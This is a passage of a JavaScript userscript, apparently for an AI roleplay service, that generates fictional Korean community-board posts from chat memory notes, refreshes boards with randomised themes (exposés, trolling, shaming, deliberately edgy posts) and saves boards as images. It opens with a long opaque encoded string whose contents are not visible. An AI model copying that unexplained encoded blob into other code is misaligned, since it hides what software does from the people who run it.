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/YbwzlnGuZjelv+C9PWJyu+Z87kS3Ke8hvLtREtnQlKVs6LahY+Gz+CB+dGE0+UXEtySqoHFyIH47U+Z8aHZr54WgdzVh9bNT57ym9iCvhhKg/zVie/Dmd6hEt2nroHl9U2OwduZ1pXYgYbay9+M+PlNhP7qx4qw3qvqT43+1YHI8lnBp7rZvP6E6slLZ0JSlau+256OqNiL3eWB5N9DDdiCvtrh84zh9YbI+pKmlhDfo/ZPi9XlgcDWlbCyEN6w5oTN1UWBz/aVt5vcroqBzv1FjsfGmMuE2buG9N2D2NmO4PuZ5JHwh96r34TL6EWBz+6Snobyhdzb24rp7U2E4d3Br7AS2uffo9qJ2/uewYwS2o6agcnNhsnRhcrJ74XckqqB3NVNjt30mfO5EtqKtkNBQYHt9YPu/caXjBLd5/tBgf3BhNLdwbasEtr93434xa/Ynv2c3q2KFoblxYHf+YTh3e+F272+qNiM4siGz9dZwbms2Y/urdaH1tGFw8nBsJzwgYDf8IHC5a3FlbGS3ISqhuvFgfjpT57ktd+oi9zZ00GB4+GE3sHBrozZl/ZPiuz4h9b+lYqyEN+0zoP72Y7my1qVqYPcr45Kg/zVjsHTnu69Etu+tof6/U2J+NOf7LES3LS6gcPZhurpT57/odmcivTdgvbJjv7zmeSR3q2KFobn+YHB7YPuxcaTrNm8/k+K/fmG5NZXDdm1itzZx43N5IHyylnBtoHfoOOD/elFhsPqla+e27iiSoPy3YnK71KVuLjbuKKB5MVES02D9PXGnojeq/JPjc/ghsrqu5rfvY7aze+K5/FNhcDExpOs8IGH5OGGw8GE+O0N2YCb2uHyjfDRTYTV3caAuBLd4cOK8NmB+s5ZwKes2b3OQUGB+NlPnt6t3oma2v3/iufxTYP09caeiBLa8ueN5vmGys5ZwKeo2bTyhO7pRYbr0ZWKshDeo+CD9PWJ8dOZ8qUS3JKygdnhTYnw21KVsIbcp4qA19GB+PVPme2537W+2vfTisz5TYPA4cGvvNmA6oLl3UWB7PqSjK4Q3pH5hOv5jubLXHMAEtqFjobL8E2J8NOZz63ZuqYWhvrlgf3lT5/9ndmcht3h543644bl5lnHg4DekflPis7NhsfKkqaWChLd79eM592B+OJZwaaY3qP9g8Ddid3HUpW6tNyvgkqDxu2J+9uZ+5US3aufgeTYgPDxT57/odmcih6G7c2B4+GC5+UN3q2O2vfbQYbn9YTvxceCsBLd+MuNyvSA8fqSp6YQ3rzOg93tifDTmdixEtuEtof94YfU3YTw4QES3KW/gfXQgPDxT5nJnd+rttruy6PaifDjmdOF2ZGS9N2D48GO8+Oe5KkS3KyugcXaTYnK9Z7krRLclbaBxchES02D8NXGrLzZpc6D/O1Fh9jKk5yKEN6R7oPG8Ynf95nmkRLbnYmA3MFNiOPXnuSpEtqCvoHy3U2J5tee453Yg5IaSoP06Y7B25n2qRLckqOGz/SA8PWD1fkN2ZqJ2//ziubBQ0+Z8oUS2oOGhsjyTY7Ox5nRldiAshaB6tmA79WD5ekN3q663eD7QYHnwYP53cGvtBLd+MuNyvSB+cZZxrmY3pb/gvT1icrvmfO5EtynvIHl9YbuyUE=');
  // ⏳ 만드는 중 표시: 흐른 시간 · 지금까지 쓴 글/댓글 수를 실시간으로 보여 줍니다(받아 오는 중에만 알 수 있는 값은 기기가 허용할 때만).
  let genProg = null, genTick = 0;
  function startGen(kind, expect = 0) {
    genProg = { kind, t0: Date.now(), chars: 0, recv: 0, posts: 0, comments: 0, expect, last: 0 };
    clearInterval(genTick);
    genTick = setInterval(() => { if (!busyNow || !genProg) { clearInterval(genTick); genProg = null; return; } paintGen(); }, 500);
  }
  function updateProg(raw) {
    const g = genProg; if (!g || Date.now() - g.last < 300) return; g.last = Date.now();
    g.recv = String(raw).length; let text = '';
    for (const line of String(raw).split('\n')) { if (!line.startsWith('data:')) continue;
      try { const j = JSON.parse(line.slice(5)); for (const p of j.candidates?.[0]?.content?.parts || []) if (!p.thought && p.text) text += p.text;
        if (j.type === 'content_block_delta' && j.delta?.type === 'text_delta') text += j.delta.text; } catch (_) {} }
    g.chars = text.length; g.posts = (text.match(/"board"\s*:/g) || []).length; g.comments = (text.match(/"text"\s*:/g) || []).length;
  }
  function genView() {
    const g = genProg, s = Math.floor((Date.now() - g.t0) / 1000), tm = `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
    const name = { board: '커뮤니티', more: '새 글', phone: '폰', pc: '컴퓨터', news: '뉴스', wiki: '위키', live: '실시간톡' }[g.kind] || '';
    const board = g.kind === 'board' || g.kind === 'more'; let info;
    if (!g.chars) info = s < 10 ? 'AI에게 기억 노트를 보내는 중…' : s < 25 ? 'AI가 노트를 읽고 구상하는 중…' : 'AI가 구상하는 중이에요 · 긴 글은 첫 글자가 나오기까지 오래 걸려요';
    else if (board && !g.posts) info = '사이트와 게시판을 만드는 중…';
    else info = board ? `글 ${g.posts}개 · 댓글 ${g.comments}개 작성됨` : `${fmt(g.chars)}자 작성됨`;
    return { name, tm, info, pct: board && g.posts && g.expect ? Math.min(96, Math.round(g.posts / g.expect * 100)) : 0 };
  }
  function paintGen() {
    if (!genProg) return; const v = genView();
    root.querySelectorAll('.gen-prog').forEach(c => { c.querySelector('.gp-time').textContent = v.tm; c.querySelector('.gp-info').textContent = v.info;
      const bar = c.querySelector('.gp-bar'); bar.classList.toggle('ind', !v.pct); bar.firstElementChild.style.width = (v.pct || 35) + '%'; });
  }
  const genCard = () => { if (!busyNow || !genProg) return ''; const v = genView();
    return `<div class="gen-prog"><div class="gp-top"><b>${esc(v.name)} 만드는 중</b><span class="gp-time">${v.tm}</span></div><div class="gp-bar${v.pct ? '' : ' ind'}"><i style="width:${v.pct || 35}%"></i></div><p class="gp-info">${esc(v.info)}</p></div>`; };
  // 유저(사용자 캐릭터)가 쓴 글·댓글은 AI가 만들었어도 빼요. 닉네임이 유저 이름이거나 몰래 쓴 사람(by)이 유저면 지웁니다.
  function scrubBoardUser(bd) {
    const d = bd?.data; if (!d) return 0;
    const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n); if (!users.length) return 0;
    const isU = x => { const k = String(x || '').trim(); return !!k && users.some(u => k === u || canon(k) === u || personAlias(u).includes(k)); };
    const bad = x => !x?.mine && (isU(x?.by) || isU(x?.nick)); let n = 0; // 내가 직접 단 댓글(mine)은 유저 이름이어도 지우지 않아요
    d.posts = (d.posts || []).filter(p => { if (bad(p)) { n++; return false; } p.comments = (p.comments || []).filter(c => { if (bad(c)) { n++; return false; } return true; }); return true; });
    return n;
  }
  const boardOf = async chatId => { try { return JSON.parse(String(await getValue('board:' + chatId, 'null')) || 'null'); } catch (_) { return null; } };
  let boardData = null;
  // from~to: 기억 노트와 함께 보낼 실제 대화 범위(턴). 원문이 너무 길면 뒤쪽(최근) 2만 4천 자만.
  // 정리를 안 했어도 커뮤니티는 열 수 있게: 노트가 없으면 최근 30턴 대화 원문을 대신 보냅니다.
  //   고른 범위(from~to)가 있으면 그 범위를 씁니다(새로고침·대댓글도 처음 고른 범위 그대로).
  const etcMemory = async (chatId, from = boardData?.from, to = boardData?.to) => { if (snapshot?.note) return noteMemory(); const end = freshTurns(); if (!(from && to)) { from = Math.max(1, end - 29); to = end; } return end ? (await rangeLogText(chatId, from, to, '기억 노트가 없어 대화 원문으로 대신함. 인물·관계는 여기서 읽을 것', 120000)).trim() : ''; };
  async function makeBoard(from = 0, to = 0) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    busyNow = true; startGen('board', 12); render(); toast('커뮤니티를 여는 중이에요… (30초~1분)');
    try {
      const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
      const who = users.length ? `[유저] ${users.join(', ')} — 이 사람이 쓴 글·댓글은 만들지 말 것` : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공이 쓴 글은 만들지 말 것';
      let log = '';
      if (from && to) { let t = 0; const pick = (await readAll(chatId)).filter(m => { if (msgRole(m) === 'user') t++; return t >= from && t <= to; });
        log = pick.map(m => `[${msgRole(m) === 'user' ? 'USER' : 'AI'}]\n${cleanLog(msgText(m))}`).join('\n\n').slice(-24000); }
      const raw = await askModel(withRules(BOARD_PROMPT, ETC_KO + etcRoll()), [who, '', ...(!snapshot?.note ? [await etcMemory(chatId, from, to)] : ['[기억 노트]', noteMemory(), ...(log ? ['', `[참고할 대화 ${from}~${to}턴 — 이 장면들을 커뮤니티 화제로 특히 많이 쓸 것]`, log] : [])])].join('\n'), '🗨커뮤니티');
      let data; try { data = parseJsonLoose(raw); } catch (_) { throw new Error('AI 답을 읽지 못했어요. 한 번 더 눌러 주세요.'); }
      boardData = { at: Date.now(), turns: snapshot.note?.turns || 0, from, to, upto: (snapshot.note?.turns || 0) + freshTurns(), data }; scrubBoardUser(boardData);
      await setValue('board:' + chatId, JSON.stringify(boardData));
      nav.bdPost = null; nav.bdBoard = ''; toast('커뮤니티가 열렸어요 🗨', 'ok', 2500);
    } catch (e) { toast('커뮤니티 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  // 🔄 새로고침: 이미 만든 커뮤니티에 새 글만 4~6개 더 올립니다(짧아서 빨라요). 기존 글은 그대로, 새 글이 맨 위로.
  const BOARD_MORE = `\n\n[이번엔 '새로고침']\n- 이미 만들어진 커뮤니티에 방금 올라온 새 글만 만든다. 사이트 이름·소개·게시판·공지·핫플은 다시 만들지 않는다. 위의 개수 규칙(전체 10~14개 등)과 출력 형식은 무시하고, JSON은 {"posts":[...]} 하나만 낸다(글 모양은 위와 같다).\n- 새 글은 4~6개. 게시판은 [이미 있는 게시판] 이름 중에서만, 여러 게시판에 고루. 글마다 댓글 4~8개(대댓글 섞기). 방금 올라온 글이므로 ago는 '방금'·'3분 전'·'20분 전'·'1시간 전' 정도, 조회·추천은 아직 적은 편(hot은 대부분 false).\n- [이미 올라온 글 제목]과 겹치거나 비슷한 글은 쓰지 않는다. 같은 화제를 이어 가더라도 후속 글·반응·다른 사람의 목격담처럼 새 각도로.
- 세 줄 요약 요구·"이게 맞냐"·주작 의심 같은 단골 멘트는 이번 새 글 전체에서 한 번 이하.`;
  // 🎲 게시판 하나만 새로고침: 테마·개수·터지는 글 수를 코드가 굴려요(AI에게 "다양하게"라고만 하면 매번 비슷해서).
  //   수위는 위 지침 그대로(낮추는 말을 넣지 않음). 형식 목록은 체크리스트가 아니라 이번 테마 하나만.
  const BOARD_THEMES = ['테마 없이 자유(실제 커뮤처럼 아무 글이나 자연스럽게)', '테마 없이 자유(실제 커뮤처럼 아무 글이나 자연스럽게)', '지금까지 없던 테마를 새로 정해 굴리기', '폭로·저격 대전', '뻘글·드립 폭주', '분탕 난입과 조리돌림', '연애·썸 썰 대전', '음모론·카더라 꼬리물기', '목격담 릴레이', '과거 박제·들추기', '편 가르기 투표와 키배', '실시간 중계 글 폭주', '해명글과 역풍', '어그로 낚시글 연쇄', '익명 제보·찌라시 살포'];
  const boardOne = (name, vibe) => `\n\n[이번엔 '${name}' 게시판만 새로고침]
- 이 게시판(${vibe || '분위기는 이름에 맞게'})에 방금 올라온 새 글만 만든다. 다른 게시판 글·사이트 정보·공지·핫플은 만들지 않는다. 위의 개수 규칙과 출력 형식은 무시하고 JSON은 {"posts":[...]} 하나만(글 모양은 위와 같다). board는 모두 "${name}".
- 이번 회차 주사위: 새 글 ${dice([4, 5, 6, 7])}개 · 그중 판이 크게 터지는 글 ${dice([1, 2, 2, 3])}개 · 이번 테마 "${dice(BOARD_THEMES)}" · 분탕 ${dice(['없음', '1명', '1명', '2명'])} · 선 넘는 글 ${dice(['0개', '1개', '1개', '2개'])}(그 게시판 기준으로 평소보다 수위 높고 아슬아슬한 글. 음지가 아니어도 됨, 아래 '쓰지 않는 것'의 선만 지킴).
- 주사위는 출발점이다. 이 게시판·이 이야기에 더 맞고 더 재밌는 글이 있으면 벗어나도 된다(수위·마라맛은 그대로).
- 주사위에 쓰인 테마 이름·낱말은 방향일 뿐이다. 그 말을 제목·본문·댓글에 그대로 쓰지 않고, 이 이야기에 맞는 새 말로 매번 다르게 쓴다.
- 테마는 이 게시판 글 흐름의 중심일 뿐, 위 지침의 형식 목록(1탄·타임라인·투표 등)을 다 채우지 않는다. 글마다 길이·형식·말투를 다르게 하고, 같은 드립·말버릇을 글마다 되풀이하지 않는다.
- 이 게시판의 분위기·말투·수위는 위 지침 그대로 끝까지 유지한다.
- 이번 새 글끼리도 화제·제목 꼴·첫 문장·드립이 서로 겹치지 않게. 매번 처음 보는 신박한 각도로(뻔한 전개면 버리고 다른 걸로).
- [이 게시판에 이미 있는 글]과 겹치거나 비슷한 제목·화제·드립은 쓰지 않는다. 같은 사건이라도 새 각도(후속·반응·다른 목격자·역풍)로.
- [다른 게시판 인기글]은 소문이 건너온 것처럼 이어받아 써도 된다(그 글을 그대로 다시 쓰지는 않음).
- 방금 올라온 글이라 ago는 '방금'~'1시간 전', 조회·추천은 아직 적은 편.`;
  async function refreshBoard(only = '') {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot || !boardData?.data) return;
    busyNow = true; startGen('more', 5); render(); toast('새 글을 불러오는 중이에요… (10~30초)');
    try {
      const d = boardData.data, posts = d.posts || [];
      const names = (d.boards || []).map(b => typeof b === 'string' ? b : b.name).filter(Boolean);
      if (!names.length) names.push(...new Set(posts.map(p => p.board).filter(Boolean)));
      if (!names.length) throw new Error('게시판이 없어요. 다시 만들어 주세요.');
      const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
      const who = users.length ? `[유저] ${users.join(', ')} — 이 사람이 쓴 글·댓글은 만들지 말 것` : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공이 쓴 글은 만들지 말 것';
      const vibeOne = only ? ((d.boards || []).find(b => (typeof b === 'string' ? b : b.name) === only)?.vibe || '') : '';
      const titles = only ? posts.filter(p => p.board === only).slice(0, 120).map(p => p.title).join('\n')
        : posts.slice(0, 40).map(p => `${p.board}: ${p.title}`).join('\n');
      const crossHot = only ? posts.filter(p => p.board !== only).sort((a, b) => (b.hot ? 1 : 0) - (a.hot ? 1 : 0) || (b.likes || 0) - (a.likes || 0)).slice(0, 5).map(p => `${p.board}: ${p.title}`).join('\n') : '';
      // 지난번(만들기·새로고침) 뒤에 새로 쌓인 턴이 있으면 그 대화를 같이 보내 새 글 화제로
      const base = boardData.upto || boardData.to || boardData.turns || 0, end = (snapshot.note?.turns || 0) + freshTurns(), last = only ? (boardData.uptoBy?.[only] ?? base) : base;
      const newLog = end > last ? await rangeLogText(chatId, last + 1, end, '지난번 뒤 새로 나온 대화 — 이번 새 글은 이 일들을 주로 화제로 삼을 것', 60000) : '';
      const raw = await askModelRetry(withRules(BOARD_PROMPT, ETC_KO + etcRoll()) + (only ? boardOne(only, vibeOne) : BOARD_MORE), [who, '', `[사이트] ${d.name || ''} — ${d.about || ''}`, only ? `[새로고침할 게시판] ${only}` : `[이미 있는 게시판] ${names.join(', ')}`, only ? '[이 게시판에 이미 있는 글]' : '[이미 올라온 글 제목]', titles, ...(crossHot ? ['', '[다른 게시판 인기글]', crossHot] : []), '', '[기억 노트]', await etcMemory(chatId), newLog].join('\n'), '🗨커뮤니티 새로고침');
      let data; try { data = parseJsonLoose(raw); } catch (_) { throw new Error('AI 답을 읽지 못했어요. 한 번 더 눌러 주세요.'); }
      // 겹침 거르기: 제목이 같거나, 두 글자 조각이 절반 넘게 겹치면 비슷한 글로 보고 버려요(이미 있는 글 + 이번에 온 글끼리).
      const norm = t => String(t || '').replace(/[\s\p{P}\p{S}]/gu, ''), grams = t => { const x = norm(t), g = new Set(); for (let k = 0; k < x.length - 1; k++) g.add(x.slice(k, k + 2)); return g; };
      const like = (a, b) => { if (!a.size || !b.size) return false; let n = 0; for (const x of a) if (b.has(x)) n++; return n / Math.min(a.size, b.size) > 0.5; };
      const pool = posts.filter(p => !only || p.board === only).map(p => grams(p.title));
      const have = { has: t => { const g = grams(t); return pool.some(x => like(g, x)); } };
      const batch = (boardData.refreshed || 0) + 1, fresh = (data.posts || []).filter(p => p && p.title && !have.has(p.title) && (pool.push(grams(p.title)), true)).slice(0, 8).map((p, i) => ({ ...p, batch, board: only || (names.includes(p.board) ? p.board : names[i % names.length]) }));
      if (!fresh.length) throw new Error((data.posts || []).length ? '새로 온 글이 다 이미 있는 글이랑 겹쳐서 버렸어요. 한 번 더 눌러 주세요.' : '새 글이 오지 않았어요. 한 번 더 눌러 주세요.');
      // 글은 쌓아 둬요(게시판 화면에서 페이지로 넘겨 봄). 너무 많아지면 가장 오래된 글부터 빠져요.
      d.posts = [...fresh, ...posts].slice(0, 400); scrubBoardUser(boardData);
      boardData.refreshed = batch;
      if (only) (boardData.uptoBy || (boardData.uptoBy = {}))[only] = Math.max(end, last);
      else { boardData.upto = Math.max(end, last); boardData.uptoBy = {}; } // 전체 새로고침이면 모든 게시판이 여기까지 반영
      await setValue('board:' + chatId, JSON.stringify(boardData));
      nav.bdPost = null; if (only) (nav.bdPage || (nav.bdPage = {}))[only] = 1; toast(`${only ? `'${only}'에 ` : ''}새 글 ${fresh.length}개가 올라왔어요 🔄`, 'ok', 2500);
    } catch (e) { toast('새로고침 실패 · ' + e.message, 'err'); }
    finally { busyNow = false; render(); }
  }
  const VIBE = {}; // 게시판 이름 앞 이모지는 기기마다 어색하게 그려져서 쓰지 않아요
  // 커뮤니티 색: 이름마다 고정된 그라데이션 두 색
  const boardColors = nm => [['#FF7A59', '#FFB36B'], ['#7B61FF', '#C08CFF'], ['#13B38B', '#7EDBB8'], ['#E24A6A', '#FF9AA2'], ['#2E3A59', '#6B7FB0'], ['#F2994A', '#F2C94C']][[...String(nm || '')].reduce((a, ch) => a + ch.codePointAt(0), 0) % 6];
  // 🖼 이미지로 저장: 지금 보이는 커뮤니티 카드를 화면 그대로(글꼴·색·배너) 찍습니다. 컴퓨터는 바로 내려받기, 아이폰은 공유 창.
  async function snapBoard() {
    const card = root.querySelector('.bd'); if (!card) return;
    // 지금 스크롤해서 보고 있는 부분만 찍습니다. 원본의 화면 위·아래 끝을, 뺄 칸(입력창 등)을 뺀 복사본 좌표로 옮겨서 자릅니다.
    const cr = card.getBoundingClientRect(), vr = (out('main') || card).getBoundingClientRect();
    const drop = [...card.querySelectorAll('.bd-snap,.bd-tools,.bd-write,.bd-typing')].map(e => e.getBoundingClientRect());
    const toClone = y => y - cr.top - drop.reduce((a, r) => a + (y >= r.bottom ? r.height : y > r.top ? y - r.top : 0), 0);
    const viewTop = toClone(Math.max(cr.top, vr.top)), viewBot = toClone(Math.min(cr.bottom, vr.bottom));
    const clone = card.cloneNode(true);
    clone.querySelectorAll('.bd-snap,.bd-tools,.bd-write,.bd-typing').forEach(x => x.remove());
    clone.querySelectorAll('.bd-by').forEach(x => { if (!/^✍/.test(x.textContent)) x.remove(); }); // 몰래 본 이름은 그대로 찍힘, 안 연 버튼만 뺌
    // 높이는 뺄 것 다 뺀 복사본으로 잼(원본으로 재면 빠진 입력창만큼 아래가 비어요)
    const w = card.offsetWidth;
    clone.style.cssText += `;position:absolute;left:-99999px;top:0;width:${w}px;visibility:hidden`;
    card.parentNode.appendChild(clone); const h = Math.ceil(clone.getBoundingClientRect().height); clone.remove();
    clone.style.position = clone.style.left = clone.style.top = clone.style.width = clone.style.visibility = '';
    const css = [...root.querySelectorAll('style')].map(x => x.textContent).join('\n').replace(/:host/g, '.snap') + '\n.snap .bd,.snap .bd *,.snap .iphone,.snap .pc{box-shadow:none!important}';
    const body = new XMLSerializer().serializeToString(clone);
    // 아주 길면(아이폰 캔버스 넓이 한도·크롬 세로 3만 2천 px 한도) 해상도만 낮춰서 끝까지 다 찍히게
    const scale = Math.min(2, Math.sqrt(16e6 / (w * h)), 32000 / h), W2 = Math.floor(w * scale), H2 = Math.floor(h * scale);
    // 화질: SVG를 처음부터 저장할 크기로 그려요(1배로 그린 뒤 늘리면 글자가 뿌옇게 돼요)
    // 아이폰은 viewBox로 foreignObject를 안 키워줘서(1배로 왼쪽 위만 그려짐) zoom으로 직접 키워요
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="${W2}" height="${H2}"><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml" class="snap" style="zoom:${scale};width:${w}px;background:#fff"><style>${css.replace(/</g, '\\3c ')}</style>${body}</div></foreignObject></svg>`;
    const img = new Image(); img.src = 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
    try { await img.decode(); } catch (_) { toast('이미지를 만들지 못했어요.', 'err'); return; }
    // 카드 전체(스크롤 위치와 상관없이 처음부터 끝까지)
    const cv = document.createElement('canvas'); cv.width = W2; cv.height = H2;
    const x = cv.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0, 0, W2, H2); x.drawImage(img, 0, 0, W2, H2);
    const name = `커뮤니티-${(boardData?.data?.name || '글').replace(/[\\/:*?"<>|]/g, '')}.png`;
    let blob; try { blob = await new Promise(r => cv.toBlob(r, 'image/png')); } catch (_) { blob = null; }
    const ios = /iPhone|iPad|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    if (!blob) { nav.bdImg = img.src; render(); return; } // 캔버스가 막힌 브라우저: 화면에 띄워 길게 눌러 저장
    const url = URL.createObjectURL(blob);
    if (!ios) { const a = document.createElement('a'); a.href = url; a.download = name; document.body.appendChild(a); a.click(); a.remove(); setTimeout(() => URL.revokeObjectURL(url), 4000); toast('이미지를 저장했어요', 'ok', 2200); return; }
    const file = new File([blob], name, { type: 'image/png' });
    try { if (navigator.canShare?.({ files: [file] })) { await navigator.share({ files: [file] }); return; } } catch (e) { if (e?.name === 'AbortError') return; }
    nav.bdImg = url; render();
  }
  // 폰·컴퓨터도 커뮤니티처럼: 고른 턴 범위의 실제 대화를 기억 노트 뒤에 붙입니다(범위 없으면 빈 글).
  async function rangeLogText(chatId, from, to, hint, max = 24000) {
    if (!(from && to)) return '';
    let t = 0; const pick = (await readAll(chatId)).filter(m => { if (msgRole(m) === 'user') t++; return t >= from && t <= to; });
    const log = pick.map(m => `[${msgRole(m) === 'user' ? 'USER' : 'AI'}]\n${cleanLog(msgText(m))}`).join('\n\n').slice(-max);
    return log ? `\n\n[참고할 대화 ${from}~${to}턴 — ${hint}]\n${log}` : '';
  }
  // 🖼 폰·모니터 이미지로 저장: 지금 보이는 기기 화면을 그대로 찍습니다(컴퓨터는 바로 내려받기, 아이폰은 공유 창).
  async function snapDevice(kind) {
    const nodes = (kind === 'pc' ? [root.querySelector('.pc'), root.querySelector('.pc-stand')] : [root.querySelector('.iphone')]).filter(Boolean);
    if (!nodes.length) return;
    const pad = 14, r0 = nodes[0].getBoundingClientRect(), r1 = nodes[nodes.length - 1].getBoundingClientRect();
    const w = Math.ceil(r0.width) + pad * 2, h = Math.ceil(r1.bottom - r0.top) + pad * 2;
    const ser = new XMLSerializer();
    const body = nodes.map(n => { const c = n.cloneNode(true); c.style.margin = '0 auto';
